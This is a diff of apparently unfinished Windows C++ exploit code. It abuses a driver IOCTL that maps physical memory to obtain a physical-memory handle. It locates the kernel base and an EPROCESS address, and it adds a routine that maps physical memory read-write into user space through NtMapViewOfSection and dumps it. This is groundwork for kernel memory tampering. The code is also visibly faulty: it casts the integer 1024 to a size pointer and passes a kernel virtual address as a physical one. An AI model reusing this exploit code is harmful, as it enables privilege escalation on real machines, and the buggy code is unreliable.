@@ -126,11 +126,51 @@ NTSTATUS UnmapPhysicalMemory(Phys32Struct& phys32) {
 	return status;
 }
 
+void print_bytes(void* ptr, int size)
+{
+	unsigned char* p = (unsigned char*)ptr;
+	int i;
+	for (i = 0; i < size; i++) {
+		printf("%02hhX ", p[i]);
+	}
+	printf("\n");
+}
+
+#define PHYSICAL_ADDRESS	LARGE_INTEGER
+using myNtMapViewOfSection = NTSTATUS(NTAPI*)(HANDLE SectionHandle, HANDLE ProcessHandle, PVOID* BaseAddress, ULONG_PTR ZeroBits, SIZE_T CommitSize, PLARGE_INTEGER SectionOffset, PSIZE_T ViewSize, DWORD64 InheritDisposition, ULONG AllocationType, ULONG Win32Protect);
+myNtMapViewOfSection fNtMapViewOfSection = (myNtMapViewOfSection)(GetProcAddress(GetModuleHandleA("ntdll"), "NtMapViewOfSection"));
+static BOOLEAN MapPhysicalMemory(HANDLE PhysicalMemory, PDWORD64 Address, PSIZE_T Length, PDWORD64 VirtualAddress)
+{
+	NTSTATUS			ntStatus;
+	PHYSICAL_ADDRESS	viewBase;
+
+	*VirtualAddress = 0;
+	viewBase.QuadPart = (ULONGLONG)(*Address);
+	ntStatus = fNtMapViewOfSection
+	(
+		PhysicalMemory,
+		GetCurrentProcess(),
+		(PVOID*)VirtualAddress,
+		0L,
+		*Length,
+		&viewBase,
+		Length,
+		2,
+		0,
+		PAGE_READWRITE
+	);
+
+	if (!NT_SUCCESS(ntStatus)) return false;
+	*Address = viewBase.LowPart;
+	return true;
+}
+
 int main(char argc, char** argv)
 {
-	printf("\n\n\nEPROCESS_adress: %p", EPROCESS_address(ntoskernl_base()));
+	__int64 kernel_base = (__int64)ntoskernl_base();
+	__int64 offset = (__int64)EPROCESS_address((LPVOID)kernel_base);
+	printf("\n\n\nEPROCESS_adress: %p", offset);
 
-	return 0;
 	HANDLE device = INVALID_HANDLE_VALUE;
 	NTSTATUS status = FALSE;
 	DWORD bytesReturned = 0;
@@ -146,7 +186,8 @@ int main(char argc, char** argv)
 	}
 
 	printf("[ ] Calling IOCTL_MapPhysicalMemoryToLinearSpace 0x%X\n", IOCTL_MapPhysicalMemoryToLinearSpace);
-	status = DeviceIoControl(device, IOCTL_MapPhysicalMemoryToLinearSpace, &phys32Struct, sizeof(phys32Struct), &phys32Struct, sizeof(phys32Struct), &bytesReturned, (LPOVERLAPPED)NULL);
+	status = DeviceIoControl(device, IOCTL_MapPhysicalMemoryToLinearSpace, &phys32Struct,
+		sizeof(phys32Struct), &phys32Struct, sizeof(phys32Struct), &bytesReturned, (LPOVERLAPPED)NULL);
 	if (status == FALSE) {
 		fprintf(stderr, "[!] IOCTL_MapPhysicalMemoryToLinearSpace failed with %X\n", status);
 		return EXIT_FAILURE;
@@ -158,7 +199,14 @@ int main(char argc, char** argv)
 	printf("phys32Struct.pvPhysAddress: %p\n", phys32Struct.pvPhysAddress);
 	printf("phys32Struct.pvPhysMemLin: %p\n", phys32Struct.pvPhysMemLin);
 
+	char virt[1024] = { 0 };
+	PDWORD64 buf = (PDWORD64)malloc(1024);
 
+	MapPhysicalMemory(phys32Struct.PhysicalMemoryHandle, (PDWORD64)kernel_base, (PSIZE_T)1024, buf);
+	printf("fNtMapViewOfSection nice");
+	system("pause");
+	print_bytes(buf, 1024);
+	
 	system("pause");
 
 	CloseHandle(phys32Struct.PhysicalMemoryHandle);
